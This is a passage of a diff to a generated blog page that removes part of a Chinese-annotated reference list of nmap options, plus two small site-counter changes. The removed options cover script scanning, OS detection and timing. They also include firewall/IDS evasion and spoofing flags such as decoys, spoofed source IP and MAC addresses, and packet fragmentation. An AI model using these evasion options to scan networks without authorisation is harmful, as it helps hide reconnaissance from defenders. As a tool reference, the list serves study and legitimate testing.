-<li>-sC （脚本扫描，一般是–script=default）</li>
-<li>–script=<Lua script> （使用Lua脚本）</li>
-<li>–script-args=&lt;n1=v1[,n2=v2]&gt; （修改参数）</li>
-<li>–script-update （脚本库更新）</li>
-<li>–script-trace （进行路由追踪）</li>
-<li>–script-help=<Lua scripts> （脚本使用教程帮助）</li>
-</ul>
-</li>
-<li>OS 扫描<ul>
-<li>-O （检测OS）</li>
-<li>–osscan-limit （OS检测限制）</li>
-<li>–osscan-guess （OS猜测）</li>
-</ul>
-</li>
-<li>时间和性能<ul>
-<li>-‘s’,’m’,’h’,’ms’ （秒、分、时、毫秒）</li>
-<li>–min-hostgroup/max-hostgroup <size> （并行扫描主机组的数量）</li>
-<li>–min-parallelism/max-parallelism <numprobes> （并行探测数量）</li>
-<li>–min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time> （rtt时间）</li>
-<li>–max-retries <tries> （最大回包时间）</li>
-<li>–host-timeout <time> （主机超时时间）</li>
-<li>–scan-delay/–max-scan-delay <time> （主机延迟发包时间）</li>
-<li>–min-rate <number> （最小发包速率）</li>
-<li>–max-rate <number> （最大发包速率）</li>
-</ul>
-</li>
-<li>防火墙/IDS躲避、欺骗<ul>
-<li>-f –mtu <val> （设置传输单元）</li>
-<li>-D &lt;decoy1,decoy2[,ME]&gt; （伪造源地址，增加噪声IP）</li>
-<li>-S <IP Address> （欺骗源地址）</li>
-<li>-e <iface> （指定使用的网卡）</li>
-<li>-g/–source-port <portnum> （指定源端口进行发包）</li>
-<li>–proxies &lt;url1,[url2]&gt; （指定代理服务器）</li>
-<li>–data <hex string> （指定十六进制字符串，在包的后面增加）</li>
-<li>–data-string <string> （增加ACSII码字符串）</li>
-<li>–data-length <num> （数据的长度）</li>
-<li>–ip-options <options> （修改IP的选项）</li>
-<li>–ttl <val> （设置IP的TTL值）</li>
-<li>–spoof-mac &lt;mac address/prefix/vendor name&gt; （欺骗MAC地址）</li>
-<li>–badsum （发送错误的TCP/UDP/SCTP 校验和）</li>
-</ul>
-</li>
-<li>MISC<ul>
-<li>-6 （可以扫IPv6地址）</li>
-<li>-A （OS，version，script，traceroute的组合命令）</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3112,7 +3376,7 @@ send 发包不收数据包</code></pre></blockquote>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">94</span>
+                  <span class="site-state-item-count">95</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3219,7 +3483,7 @@ send 发包不收数据包</code></pre></blockquote>
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">95.3k</span>
+    <span title="Site words total count">95.9k</span>
   
 </div>
 
